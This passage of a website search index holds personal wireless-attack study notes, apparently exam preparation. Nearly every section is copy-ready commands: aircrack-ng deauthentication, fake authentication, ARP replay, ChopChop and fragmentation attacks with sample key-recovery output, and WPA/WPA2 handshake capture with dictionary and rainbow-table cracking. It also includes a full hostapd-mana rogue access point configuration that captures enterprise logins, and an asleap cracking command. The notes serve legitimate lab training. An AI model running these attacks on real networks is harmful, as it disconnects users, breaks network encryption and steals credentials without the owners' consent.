(BSSID: AA:BB:CC:DD:EE:FF) on channel 3\n01:56:20  Sending Authentication Request (Open System) [ACK]\n01:56:20  Authentication successful\n01:56:20  Sending Association Request [ACK]\n01:56:20  Association successful :-) (AID: 1)\n\n# Also a new client is added and AUTH set to OPN\n[CH  3 ][ Elapsed: 5 mins ][ 2023-06-13 01:57 ][ paused output\nBSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID\nAA:BB:CC:DD:EE:FF  -53 100     2987      303    0   3   54e. WEP  WEP    OPN  wifu\n\nBSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes\nAA:BB:CC:DD:EE:FF  AA:AA:AA:AA:AA -71   54e-54e     0      457\n</code></pre>"},{"location":"wireless/attacks/wep/01-fakeauth/#references","title":"References","text":"<ul> <li>Airmon-ng</li> <li>Aireplay-ng</li> <li>Airodump-ng</li> <li>Fake Authentication</li> </ul>"},{"location":"wireless/attacks/wep/01-fakeauthkey/","title":"Fake Authentication Attack - Bypassing the Password Shared Key (PSK)(WEP)","text":"<p>This attack focuses on an AP that is using PSK authentication.</p> <ul> <li>Run setup first</li> <li>Up to three terminals are needed</li> </ul> <pre><code># [Terminal One]\n# Set interface to monitor mode\nsudo airmon-ng start $ADAPTER $CHANNEL\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE\n\n# [Terminal Two]\n# Run the deauthentication attack\nsudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE\n\n# Verify that the PRGA .xor file was created\nls *.xor\n\n# Contruct the correct PRGA path name\nPRGA=$(echo \"$TAG-01-$BSSID.xor\" | sed 's/\\:/-/'g)\n\n# Run the fake authentication attack with PRGA file\nsudo aireplay-ng --fakeauth 0 -y $PRGA -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE\n\n# Look for Association successful message :)\n\n# Run the arpreplay attack to generate IVs\nsudo aireplay-ng --arpreplay -b $BSSID -h $INTERFACEMAC $INTERFACE\n\n# [Terminal 3]\n# Run the deauthentication attack again to generate more IVs\nsudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE\n\n# Wait for enough data ... several minutes or so\n# Stop everything\n\n# Crack the WEP keister (ensure that plenty of IVs are captured beforehand)\nsudo aircrack-ng -0 $PCAP\n</code></pre>"},{"location":"wireless/attacks/wep/01-fakeauthkey/#references","title":"References","text":"<ul> <li>Aircrack-ng</li> <li>Airmon-ng</li> <li>Aireplay-ng</li> <li>Airodump-ng</li> <li>Fake Authentication</li> </ul>"},{"location":"wireless/attacks/wep/02-interactive/","title":"Interactive Packet Replay - (Attacking a Connected Client) (WEP)","text":"<p>This attack allows you to choose a specific packet for replaying (injecting). The attack can obtain packets to replay from two sources. The first being a live flow of packets from your wireless card. The second being from a pcap file. Standard Pcap format (Packet CAPture, associated with the libpcap library http://www.tcpdump.org), is recognized by most commercial and open-source traffic capture and analysis tools. Reading from a file is an often overlooked feature of aireplay-ng. This allows you read packets from other capture sessions or quite often, various attacks generate pcap files for easy reuse. A common use of reading a file containing a packet your created with packetforge-ng.</p>"},{"location":"wireless/attacks/wep/02-interactive/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> <li>Two terminals are needed</li> <li>At least one client must be associated with the AP</li> </ul> <p><pre><code># [Terminal One]\n# Set interface to monitor mode\nsudo airmon-ng start $ADAPTER $CHANNEL\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE\n\n# [Terminal Two]\n# Run the fake authentication attack\nsudo aireplay-ng --fakeauth 0 -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE\n\n# Run the interactive attack against the client and wait\nsudo aireplay-ng --interactive -b $BSSID -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 $INTERFACE\n</code></pre> * View output. This is a candidate ARP packet to be used for injection.</p> <pre><code>No source MAC (-h) specified. Using the device MAC (AB:CD:EF:12:34:56)\nRead 171 packets...\n\n        Size: 86, FromDS: 1, ToDS: 0 (WEP)\n\n              BSSID  =  AA:BB:CC:DD:EE:FF\n          Dest. MAC  =  FF:FF:FF:FF:FF:FF\n         Source MAC  =  11:22:33:44:55:FF\n\n        0x0000:  0842 0000 ffff ffff ffff 009f a924 b928  .B...........$.(\n        0x0010:  109f a924 b925 e0fc b18f 0500 0991 2b11  ...$.%........+.\n        0x0020:  b707 3a2c 50b7 4f19 3098 3cd4 9e38 21cb  ..:,P.O.0.&lt;..8!.\n        0x0030:  559c d938 d229 04db 45d8 a4b7 85fe 6634  U..8.)..E.....f4\n        0x0040:  4a7d 5996 5822 817e 2b7a 0c12 0326 0661  J}Y.X\".~+z...&amp;.a\n        0x0050:  cd3e 57e8 9d1f                           .&gt;W...\n\nUse this packet ?\n\n# Say yes and monitor the data ... it should be getting big.\n# If not, then ctrl-c ... try another\n# Keep doing until the data starts to increase\n</code></pre> <pre><code># Crack the WEP keister (ensure that plenty of IVs are captured beforehand)\nsudo aircrack-ng -0 $PCAP\n</code></pre> <ul> <li>Look for the suscessful output - assuming enough IVs are available</li> </ul> <pre><code>Reading packets, please wait...\nOpening wifu-01.cap\nRead 806868 packets.\n\n   #  BSSID              ESSID                     Encryption\n\n   1  AA:BB:CC:DD:EE:FF  wifu                      WGot 184612 out of 180000 IVsStarting PTW attack with 184612 ivs.\n                     KEY FOUND! [ 31:32:33:34:35 ] (ASCII: 12345 )\nChoosingDecrypted correctly: 100%\n</code></pre>"},{"location":"wireless/attacks/wep/02-interactive/#using-an-existing-ap-packet","title":"Using an Existing AP Packet","text":"<pre><code># Use an existing AP packet file\nsudo aireplay-ng --interactive -r replay_src-0613-135427.cap $INTERFACE\n</code></pre>"},{"location":"wireless/attacks/wep/02-interactive/#references","title":"References","text":"<ul> <li>Aircrack-ng</li> <li>Airmon-ng</li> <li>Aireplay-ng</li> <li>Airodump-ng</li> <li>Interactive Packet Replay</li> </ul>"},{"location":"wireless/attacks/wep/03-arpreplay/","title":"ARP Request Replay Attack (Attacking the AP/Connected) (WEP)","text":"<p>The classic ARP request replay attack is the most effective way to generate new initialization vectors (IVs), and works very reliably. The program listens for an ARP packet then retransmits it back to the access point. This, in turn, causes the access point to repeat the ARP packet with a new IV. The program retransmits the same ARP packet over and over. However, each ARP packet repeated by the access point has a new IVs. It is all these new IVs which allow you to determine the WEP key.</p> <p>ARP is address resolution protocol: A TCP/IP protocol used to convert an IP address into a physical address, such as an Ethernet address. A host wishing to obtain a physical address broadcasts an ARP request onto the TCP/IP network. The host on the network that has the address in the request then replies with its physical hardware address.</p>"},{"location":"wireless/attacks/wep/03-arpreplay/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> <li>Up to three terminals are needed</li> <li>At least one client must be associated with the AP</li> </ul> <p><pre><code># [Terminal One]\n# Set interface to monitor mode\nsudo airmon-ng start $ADAPTER $CHANNEL\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE\n\n# [Terminal Two]\n# Run the fake authentication attack first\nsudo aireplay-ng --fakeauth 0 -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE\n\n# Run the ARP replay attack\nsudo aireplay-ng --arpreplay -b $BSSID -h $INTERFACEMAC $INTERFACE\n\n# Watch for the data to rapidly increase in the aireplay-ng window\n# To speed things up, do the next step - deauthentication attack\n\n# [Terminal Three]\n# Run the deauthentication attack (to help facilitate ARP packets for IVs)\nsudo aireplay-ng --deauth 7 -a $BSSID -c $CLIENT $INTERFACE\n\n# Get lots and lots of IVs (several minutes &gt; 150K data ... mileage may vary though)\n# Stop everything\n\n# Crack the WEP keister (ensure that plenty of IVs are captured beforehand)\nsudo aircrack-ng -0 $PCAP\n</code></pre> * Look for the suscessful output - assuming enough IVs are available</p> <pre><code>1 potential targets                                 Got 156299 out of 155000 IVsStarting PTW attack with 156299 ivs.\n                     KEY FOUND! [ AA:BB:CC:DD:EE:FF ] (ASCII: 12345 )\nAttack wDecrypted correctly: 100%00 captured ivs.\n</code></pre>"},{"location":"wireless/attacks/wep/03-arpreplay/#references","title":"References","text":"<ul> <li>Aircrack-ng</li> <li>Airmon-ng</li> <li>Aireplay-ng</li> <li>Airodump-ng</li> <li>ARP Request Replay</li> </ul>"},{"location":"wireless/attacks/wep/04-chopchop/","title":"Korek ChopChop Attack (Clientless) (WEP)","text":"<p>This attack, when successful, can decrypt a WEP data packet without knowing the key. It can even work against dynamic WEP. This attack does not recover the WEP key itself, but merely reveals the plaintext. However, some access points are not vulnerable to this attack. Some may seem vulnerable at first but actually drop data packets shorter that 60 bytes. If the access point drops packets shorter than 42 bytes, aireplay tries to guess the rest of the missing data, as far as the headers are predictable. If an IP packet is captured, it additionally checks if the checksum of the header is correct after guessing the missing parts of it. This attack requires at least one WEP data packet.</p>"},{"location":"wireless/attacks/wep/04-chopchop/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> <li>Three terminals are needed</li> <li>NO clients associated with the AP</li> </ul> <pre><code># [Terminal One]\n# Set interface to monitor mode\nsudo airmon-ng start $ADAPTER $CHANNEL\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE\n\n# [Terminal Two]\n# Run the fake authentication attack with prolonged reassociation timing (every 60 secs)\nsudo aireplay-ng --fakeauth 60 -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE\n\n# [Terminal Three]\nsudo aireplay-ng --chopchop -b $BSSID -h $INTERFACEMAC $INTERFACE\n\n# Wait for 'Use this packet y' then enter y\n# Wait for a loooong time to reach 100% done.\n# It's possible to use less than 100% but risky\n# Look for a replay_dec-*.xor file\n\n# Forge a fake packet, -l source, -k destination\nsudo packetforge-ng -0 -a $BSSID -h $INTERFACEMAC -l 255.255.255.255 -k 255.255.255.255 -y replay_dec-0613-175215.xor -w inject.cap\n\n# Check veracity of file\ntcpdump -n -vvv -e -s0 -r inject.cap\n\nreading from file inject.cap, link-type IEEE802_11 (802.11), snapshot length 65535\n17:55:05.191216 Protected 258us BSSID:AA:BB:CC:DD:EE:FF SA:FF:EE:DD:CC:BB:AA DA:ff:ff:ff:ff:ff:ff Data IV:5cbca Pad 0 KeyID 0\n\n# Run the interactive attack against the client\nsudo aireplay-ng --interactive -r inject.cap $INTERFACE\n\n# Watch for the data to explode in size with lots of IVs :)\n# If successful, data should get large\n# Stop everything\n\n# Crack the WEP keister (ensure that plenty of IVs are captured beforehand)\nsudo aircrack-ng -0 $PCAP\n</code></pre> <ul> <li>View the output for the success message</li> </ul> <pre><code>Reading packets, please wait...\nOpening wifu-01.cap\nRead 441431 packets.\n\n   #  BSSID              ESSID                     Encryption\n\n   1  AA:BB:CC:DD:EE:FF  wifu                      WEGot 74852 out of 70000 IVsStarting PTW attack with 74852 ivs.\n                     KEY FOUND! [ 31:32:33:34:35 ] (ASCII: 12345 )\nChoosingDecrypted correctly: 100%\n</code></pre>"},{"location":"wireless/attacks/wep/04-chopchop/#references","title":"References","text":"<ul> <li>Aircrack-ng</li> <li>Airmon-ng</li> <li>Aireplay-ng</li> <li>Airodump-ng</li> <li>KoreK ChopChop</li> <li>ChopChop Theory</li> <li>Learning Thing</li> </ul>"},{"location":"wireless/attacks/wep/05-fragment/","title":"Fragmentation (Clientless) (WEP)","text":"<p>This attack, when successful, can obtain 1500 bytes of PRGA (pseudo random generation algorithm). This attack does not recover the WEP key itself, but merely obtains the PRGA. The PRGA can then be used to generate packets with packetforge-ng which are in turn used for various injection attacks. It requires at least one data packet to be received from the access point in order to initiate the attack.</p> <p>Basically, the program obtains a small amount of keying material from the packet then attempts to send ARP and/or LLC packets with known content to the access point (AP). If the packet is successfully echoed back by the AP then a larger amount of keying information can be obtained from the returned packet. This cycle is repeated several times until 1500 bytes of PRGA are obtained or sometimes less then 1500 bytes.</p>"},{"location":"wireless/attacks/wep/05-fragment/#commands","title":"Commands","text":"<p>NOTE: Fragmentation attack does not appear to be supported in my lab. Even injection testing fails between two adapters. These steps assume that it works just in case the exam asks for it.</p> <ul> <li>Run setup first</li> <li>Two terminals are needed</li> <li>NO clients associated with the AP</li> </ul> <pre><code># [Terminal One]\n# Set interface to monitor mode\nsudo airmon-ng start $ADAPTER $CHANNEL\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE\n\n# [Terminal Two]\n# Run the fake authentication attack with prolonged reassociation timing (every 60 secs)\nsudo aireplay-ng --fakeauth 60 -a $BSSID -e $SSID -h $INTERFACEMAC $INTERFACE\n\n# [Terminal Three]\nsudo aireplay-ng --fragment -b $BSSID -h $INTERFACEMAC $INTERFACE\n\n# Wait for 'Use this packet y' then enter y\n# If successful - look for 'Got RELAYED packet!!' message\n# Look for a fragment-*.xor file\n# I could not get this far :(\n\n# Forge a fake packet, -l source, -k destination\nsudo packetforge-ng -0 -a $BSSID -h $INTERFACEMAC -l 255.255.255.255 -k 255.255.255.255 -y fragment-0613-175215.xor -w inject.cap\n\n# Check veracity of file\ntcpdump -n -vvv -e -s0 -r inject.cap\n\nreading from file inject.cap, link-type IEEE802_11 (802.11), snapshot length 65535\n17:55:05.191216 Protected 258us BSSID:AA:BB:CC:DD:EE:FF SA:FF:EE:DD:CC:BB:AA DA:ff:ff:ff:ff:ff:ff Data IV:5cbca Pad 0 KeyID 0\n\n# Run the interactive attack against the client\nsudo aireplay-ng --interactive -r inject.cap $INTERFACE\n\n# Watch for the data to explode in size with lots of IVs :)\n# If successful, data should get large\n# Stop everything\n\n# Crack the WEP keister (ensure that plenty of IVs are captured beforehand)\nsudo aircrack-ng -0 $PCAP\n</code></pre> <ul> <li>View the output for the success message</li> </ul> <pre><code>Reading packets, please wait...\nOpening wifu-01.cap\nRead 441431 packets.\n\n   #  BSSID              ESSID                     Encryption\n\n   1  AA:BB:CC:DD:EE:FF  wifu                      WEGot 74852 out of 70000 IVsStarting PTW attack with 74852 ivs.\n                     KEY FOUND! [ 31:32:33:34:35 ] (ASCII: 12345 )\nChoosingDecrypted correctly: 100%\n</code></pre>"},{"location":"wireless/attacks/wep/05-fragment/#references","title":"References","text":"<ul> <li>Aircrack-ng</li> <li>Airmon-ng</li> <li>Aireplay-ng</li> <li>Airodump-ng</li> <li>Fragmentation</li> </ul>"},{"location":"wireless/attacks/wep/09-test/","title":"Injection Test (WEP/WPA/WPA2)","text":"<p>The injection test determines if your card can successfully inject and determine the ping response times to the Access Point (AP). If you have two wireless cards, it can also determine which specific injection tests can be successfully performed.</p> <ul> <li>Run setup first</li> <li>One terminal needed only</li> <li>Use two adapters if available</li> </ul> <pre><code># Set interface to monitor mode\nsudo airmon-ng start $ADAPTER $CHANNEL\n\n# Do a quick injection test to ensure it works\nsudo aireplay-ng --test $INTERFACE\n\n# OR do a better injection test if two interfaces are available\nsudo aireplay-ng --test -i $ADAPTER2 $INTERFACE\n</code></pre>"},{"location":"wireless/attacks/wep/09-test/#references","title":"References","text":"<ul> <li>Airmon-ng</li> <li>Aireplay-ng</li> <li>Injection Test</li> </ul>"},{"location":"wireless/attacks/wpa/aircrack-ng/","title":"Aircrack-ng (WPA/WPA2)","text":"<p>Using just the <code>aircrack-ng</code> suite of tools to crack the secret.</p>"},{"location":"wireless/attacks/wpa/aircrack-ng/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> <li>Two terminals are needed</li> <li>At least on client associated with the AP</li> </ul> <pre><code># [Terminal One]\n# Set interface to monitor mode\nsudo airmon-ng start $INTERFACE\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap $INTERFACE\n\n# [Terminal Two]\n# Run the deauthentication attack to get four-way handshake\nsudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE\n\n# Wait for the four-way handshake to appear in airodump-ng window.\n</code></pre> <pre><code># Stop airodump-ng when it appears\nqq\n\n# Crack the password\nsudo aircrack-ng -0 -w $WORDLIST -b $BSSID -e $SSID $PCAP\n</code></pre> <pre><code># Check by decrypting PCAP file with found key\nsudo airdecap-ng -l -p password123 -e $SSID $PCAP\n\n# Look at the decrypted data\nsudo wireshark $TAG-01-dec.cap\n</code></pre> <ul> <li>If password is not found:<ul> <li>Make sure that a four-way handshake is captured</li> <li>Use a better password file</li> </ul> </li> </ul>"},{"location":"wireless/attacks/wpa/aircrack-ng/#references","title":"References","text":"<ul> <li>Aircrack-ng</li> <li>Aireplay-ng</li> <li>Airmon-ng</li> <li>Airodump-ng</li> </ul>"},{"location":"wireless/attacks/wpa/airolib-ng/","title":"Airolib-ng with Aircrack-ng (WPA/WPA2)","text":"<p>Setting up and using the <code>airolib-ng</code> tool with <code>aircrack-ng</code> suite of tools to crack the secret.</p>"},{"location":"wireless/attacks/wpa/airolib-ng/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> <li>Two terminals are needed</li> <li>At least on client associated with the AP</li> </ul> <pre><code># [Terminal One]\n# Set interface to monitor mode\nsudo airmon-ng start $INTERFACE\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap $INTERFACE\n\n# [Terminal Two]\n# Run the deauthentication attack to get four-way handshake\nsudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE\n\n# Wait for the four-way handshake to appear in airodump-ng window.\n\n# Stop airodump-ng when it appears\nqq\n\n# Create list of one or more SSIDs\necho $SSID &gt; $SSID.txt\n\n# Import that list into a new airolib-ng database\nairolib-ng $SSID.sqlite --import essid $SSID.txt\n\n# Query the imported list\nairolib-ng $SSID.sqlite --stats\n\n# Import John's password WORDLIST\nairolib-ng $SSID.sqlite --import passwd $WORDLIST\n\n# Batch process the WORDLIST for each SSID\nairolib-ng wifu.sqlite --batch\n\n# Query the results\nairolib-ng wifu.sqlite --stats\n\n# Krakatoa the password\naircrack-ng -0 -r $SSID.sqlite $PCAP\n</code></pre>"},{"location":"wireless/attacks/wpa/airolib-ng/#references","title":"References","text":"<ul> <li>Aircrack-ng</li> <li>Airolib-ng</li> <li>Airmon-ng</li> <li>Airodump-ng</li> </ul>"},{"location":"wireless/attacks/wpa/cowpatty/","title":"CoWPAtty Attack (WPA/WPA2)","text":"<p>Use CoWPAtty to crack the password in either dictionary/wordlist mode (plaintext) or hash/rainbow. The latter is quicker.</p>"},{"location":"wireless/attacks/wpa/cowpatty/#installation","title":"Installation","text":"<pre><code># Install cowpatty/genpmk\nsudo apt-get update\nsudo apt-get install cowpatty -y\n</code></pre>"},{"location":"wireless/attacks/wpa/cowpatty/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> <li>Two terminals are needed</li> <li>At least on client associated with the AP</li> </ul> <pre><code># [Terminal One]\n# Set interface to monitor mode\nsudo airmon-ng start $INTERFACE\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap $INTERFACE\n\n# [Terminal Two]\n# Run the deauthentication attack to get four-way handshake\nsudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE\n\n# Wait for the four-way handshake to appear in airodump-ng window.\n\n# Stop airodump-ng when it appears\nqq\n\n# Check if four-way handshake is indeed valid\ncowpatty -r $PCAP -c\n</code></pre>"},{"location":"wireless/attacks/wpa/cowpatty/#wordlist-mode","title":"WORDLIST Mode","text":"<ul> <li>Crack the password in hash mode (slowest)</li> </ul> <pre><code># Crack the password in dictionary mode\n# Cowpatty running wordlist is slower than aircrack-ng\ncowpatty -r $PCAP -f $WORDLIST -s $SSID\n</code></pre>"},{"location":"wireless/attacks/wpa/cowpatty/#rainbow-mode","title":"RAINBOW Mode","text":"<ul> <li>Crack the password in hash mode (fastest)</li> </ul> <pre><code># Need to first generate a RAINBOW table based on a provided WORDLIST/SSID\ngenpmk -f $WORDLIST -d $RAINBOW -s $SSID\n\n## Crack the password with the RAINBOW table and filter by SSID\ncowpatty -r $PCAP -d $RAINBOW -s $SSID\n</code></pre>"},{"location":"wireless/attacks/wpa/cowpatty/#references","title":"References","text":"<ul> <li>cowpatty</li> </ul> <pre><code>cowpatty -h\ncowpatty 4.8 - WPA-PSK dictionary attack. &lt;jwright@hasborg.com&gt;\n\nUsage: cowpatty [options]\n\n        -f      Dictionary file\n        -d      Hash file (genpmk)\n        -r      Packet capture file\n        -s      Network SSID (enclose in quotes if SSID includes spaces)\n        -c      Check for valid 4-way frames, does not crack\n        -h      Print this help information and exit\n        -v      Print verbose information (more -v for more verbosity)\n        -V      Print program version and exit\n</code></pre> <pre><code>genpmk -h\ngenpmk 1.3 - WPA-PSK precomputation attack. &lt;jwright@hasborg.com&gt;\nUsage: genpmk [options]\n\n        -f      Dictionary file\n        -d      Output hash file\n        -s      Network SSID\n        -h      Print this help information and exit\n        -v      Print verbose information (more -v for more verbosity)\n        -V      Print program version and exit\n\nAfter precomputing the hash file, run cowpatty with the -d argument.\n</code></pre>"},{"location":"wireless/attacks/wpa/cowpatty/#references_1","title":"References","text":"<ul> <li>Aircrack-ng</li> <li>Aireplay-ng</li> <li>Airmon-ng</li> <li>Airodump-ng</li> <li>Cowpatty</li> <li>Rainbow Tables</li> </ul>"},{"location":"wireless/attacks/wpa/crunch/","title":"Crunch with Aircrack-ng (WPA/WPA2)","text":"<p>Use this tool to crack WPA/WPA2 passwords with aircrack-ng</p>"},{"location":"wireless/attacks/wpa/crunch/#commands","title":"Commands","text":"<pre><code># Pipe crunch's generated passwords to aircrack-ng\ncrunch 11 11 -t password%%% | aircrack-ng -e $SSID $PCAP -w -\n</code></pre> <pre><code># Some other ways to generate passwords\ncrunch 8 9\ncrunch 8 9 abc123\n\n# @ represents lowercase characters or characters from a defined set\n# , represents uppercase characters\n# % represent numbers\n#^ represents symbols\n\ncrunch 11 11 -t password%%%\ncrunch 11 11 0123456789 -t password@@@\ncrunch 1 1 -p abcde12345\ncrunch 1 1 -p dog cat bird\ncrunch 5 5 -t ddd%% -p dog cat bird\n</code></pre>"},{"location":"wireless/attacks/wpa/crunch/#reference","title":"Reference","text":"<ul> <li>Crunch - Wordlist Generator</li> </ul>"},{"location":"wireless/attacks/wpa/enterprise/","title":"Enterprise","text":"<ul> <li>Uses Extensible Authentication Protocol (EPA) framework to allow for different types of authentication</li> <li>Authentication is done using a Remote Authentication Dial-In User Service (RADIUS) server</li> <li>Client authenticates using EAP frames depending on the agreed upon authentication scheme</li> <li>They are relayed by the AP to the RADIUS server</li> <li>If authentication is successfull, then the result is used as a Pairwise Master Key (PMK) for the four-way hanshake instead of the Pre Shared Key (PSK).</li> </ul> <p>We will create a rogue AP that matches the target closely</p>"},{"location":"wireless/attacks/wpa/enterprise/#peap-exchange","title":"PEAP Exchange","text":""},{"location":"wireless/attacks/wpa/enterprise/#installation","title":"Installation","text":"<p><pre><code># Hostapd-mana\nsudo apt-get install hostapd-mana -y\n</code></pre> Rogue AP with Mana Instructions</p> <pre><code># Install and configure freeradius (optional)\nsudo apt-get install freeradius -y\n</code></pre>"},{"location":"wireless/attacks/wpa/enterprise/#commands","title":"Commands","text":"<ul> <li>Run setup first</li> <li>Two terminals are needed</li> <li>At least on client associated with the AP</li> </ul> <pre><code># [Terminal One]\n# Collect data about the victim AP - specifically CA stuff\n# The goal is to create a rogue AP\nsudo airodump-ng $INTERFACE\n\n# Look for MGT as AUTH - this is enterprise\n\n# Stop it\nqq\n\n# Now target is found, do normal capture of it\n\n# Set interface to monitor mode\nsudo airmon-ng start $INTERFACE\n\n# Start monitoring to collect data\nsudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap $INTERFACE\n\n# [Terminal Two]\n# Run the deauthentication attack to get four-way handshake\nsudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE\n\n# Wait for the four-way handshake to appear in airodump-ng window.\n\n# Stop it\nqq\n\n# Turn off monitor mode\nsudo airmon-ng stop $INTERFACE\n\n# Open Wirshark\nsudo wireshark $PCAP\n\n# Filter for certificate\ntls.handshake.certificate\n# OR\ntls.handshake.type == 11,3\n\n# Drill down to get the certs\n# Extensible Authentication Protocol -&gt; Transport Layer Security -&gt; TLSv1 Record layer: Handshake Protocol Certificate ...\n#Expand Handshake Protocol: Certificate\n#Certificates\n#... one or more certificates will appear as Certificate: &lt;details&gt;\n# For each certificate, right click and select Export Packet Bytes\n# Save each one with the .der extension\n# Display info\n# openssl x509 -inform der -in DER_CERTIFICATE_FILENAME -text\n# Convert to PEM format\n# openssl x509 -inform der -in DER_CERTIFICATE_FILENAME -outform pem -out PEM_OUTPUT.crt\n\n# [Terminal Two]\n# Setup FreeRADIUS\nsudo apt-get install freeradius -y\n\n# Grab info about certs\nopenssl x509 -inform der -in DER_CERTIFICATE_FILENAME -text\n\n# Alter FreeRADIUS in the CA block\nsudo vi /etc/freeradius/3.0/certs/ca.cnf\n\n[certificate_authority]\ncountryName             = US\nstateOrProvinceName     = OR\nlocalityName            = Portland\norganizationName        = Ashat\nemailAddress            = ca@ashat.com\ncommonName              = \"Ashat Certificate Authority\"\n\n# Alter FreeRADIUS server block w/same info\n[certificate_authority]\ncountryName             = US\nstateOrProvinceName     = OR\nlocalityName            = Portland\norganizationName        = Ashat\nemailAddress            = ca@ashat.com\ncommonName              = \"Ashat Certificate Authority\"\n\ncd /etc/freeradius/3.0/certs/\nrm dh &amp;&amp; make\n\n# Ignore the error\n</code></pre>"},{"location":"wireless/attacks/wpa/enterprise/#host-mana-section","title":"HOST-MANA SECTION","text":"<pre><code># Create the mana file - from Andrew Long\n\n# SSID of the AP\nssid=NetworkName\n\n# Network interface to use and driver type\n# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'\ninterface=wlan0\ndriver=nl80211\n\n# Channel and mode\n# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)\n\nchannel=1 #update this\n\n# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax\nhw_mode=g\n\n# Setting up hostapd as an EAP server\nieee8021x=1\neap_server=1\n\n# Key workaround for Win XP\neapol_key_index_workaround=0\n\n# EAP user file we created earlier\neap_user_file=/etc/hostapd-mana/mana.eap_user\n\n# Certificate paths created earlier\nca_cert=/etc/freeradius/3.0/certs/ca.pem\nserver_cert=/etc/freeradius/3.0/certs/server.pem\nprivate_key=/etc/freeradius/3.0/certs/server.key\n# The password is actually 'whatever'\nprivate_key_passwd=whatever\ndh_file=/etc/freeradius/3.0/certs/dh\n\n# Open authentication\nauth_algs=1\n# WPA/WPA2\nwpa=3\n# WPA Enterprise\nwpa_key_mgmt=WPA-EAP\n# Allow CCMP and TKIP\n# Note: iOS warns when network has TKIP (or WEP)\nwpa_pairwise=CCMP TKIP\n\n# Enable Mana WPE\nmana_wpe=1\n\n# Store credentials in that file\nmana_credout=/tmp/hostapd.credout\n\n# Send EAP success, so the client thinks it's connected\nmana_eapsuccess=1\n\n# EAP TLS MitM\nmana_eaptls=1\n\n-------------------\n\n# SSID of the AP\nssid=Playtronics\n\n# Network interface to use and driver type\n# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'\ninterface=wlan0\ndriver=nl80211\n\n# Channel and mode\n# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)\nchannel=1\n# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax\nhw_mode=g\n\n# Setting up hostapd as an EAP server\nieee8021x=1\neap_server=1\n\n# Key workaround for Win XP\neapol_key_index_workaround=0\n\n# EAP user file we created earlier\neap_user_file=/etc/hostapd-mana/mana.eap_user\n\n# Certificate paths created earlier\nca_cert=/etc/freeradius/3.0/certs/ca.pem\nserver_cert=/etc/freeradius/3.0/certs/server.pem\nprivate_key=/etc/freeradius/3.0/certs/server.key\n# The password is actually 'whatever'\nprivate_key_passwd=whatever\ndh_file=/etc/freeradius/3.0/certs/dh\n\n# Open authentication\nauth_algs=1\n# WPA/WPA2\nwpa=3\n# WPA Enterprise\nwpa_key_mgmt=WPA-EAP\n# Allow CCMP and TKIP\n# Note: iOS warns when network has TKIP (or WEP)\nwpa_pairwise=CCMP TKIP\n\n# Enable Mana WPE\nmana_wpe=1\n\n# Store credentials in that file\nmana_credout=/tmp/hostapd.credout\n\n# Send EAP success, so the client thinks it's connected\nmana_eapsuccess=1\n\n# EAP TLS MitM\nmana_eaptls=1\n\n# MOVE THE FILE TO /etc/hostapd-mana/mana.conf\n#-----------------------------\n# mana.eap_user\n\n*     PEAP,TTLS,TLS,FAST\n\"t\"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    \"pass\"   [2]\n\n\n-------------------\n\n*     PEAP,TTLS,TLS,FAST\n\"t\"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    \"pass\"   [2]\n\n\n# MOVE THE FILE TO /etc/hostapd-mana/mana.eap_user\n\n# Start hostapd-mana\nsudo hostapd-mana /etc/hostapd-mana/mana.conf\n\n\n# Hostapd-mana will output asleap commands, find a user with a successful login (from wireshark traffic) and # run command like so:\n\nasleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W $WORDLIST\n</code></pre> <pre><code>vi wpa_supplicant.conf\n\nnetwork={\n  ssid=\"NetworkName\"\n  scan_ssid=1\n  key_mgmt=WPA-EAP\n  identity=\"Domain\\username\"\n  password=\"password\"\n  eap=PEAP\n  phase1=\"peaplabel=0\"\n  